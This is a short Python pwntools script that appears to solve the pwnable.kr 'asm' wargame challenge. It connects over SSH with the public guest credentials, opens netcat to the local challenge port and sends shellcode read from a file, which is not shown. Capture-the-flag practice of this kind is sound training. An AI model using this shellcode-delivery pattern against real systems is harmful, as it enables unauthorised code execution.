from pwn import *

r = ssh(host='pwnable.kr', user='asm', port=2222, password='guest')

p = r.process(['nc', '0', '9026'])

print p.recv()

f = open("shellcode", "rb")

shellcode = f.read()

# print shellcode

p.sendline(shellcode)

print p.recv()
